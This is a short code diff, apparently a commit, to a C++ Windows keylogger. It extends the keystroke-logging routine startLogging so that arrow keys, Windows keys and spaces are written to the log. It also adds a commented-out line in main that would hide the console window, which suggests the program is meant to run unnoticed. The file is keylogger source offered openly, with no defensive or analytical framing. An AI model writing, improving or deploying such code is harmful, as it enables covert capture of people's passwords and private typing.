@@ -34,7 +34,25 @@ void startLogging(){
                     log << "[TAB]";
                     break;
                 case VK_SPACE:
-                    log << "[SPACE]";
+                    log << " ";
+                    break;
+                case VK_LEFT:
+                    log << "←";
+                    break;
+                case VK_UP:
+                    log << "↑";
+                    break;
+                case VK_DOWN:
+                    log << "↓";
+                    break;
+                case VK_RIGHT:
+                    log << "→";
+                    break;
+                case VK_LWIN:
+                    log << "[LWIN]";
+                    break;
+                case VK_RWIN:
+                    log << "[RWIN]";
                     break;
                 case VK_MENU:
                     log << "[ALT]";
@@ -51,6 +69,6 @@ void startLogging(){
 }
 
 int main(){
+   // ShowWindow(GetConsoleWindow(), SW_HIDE);
     startLogging();
-    return 0;
 }
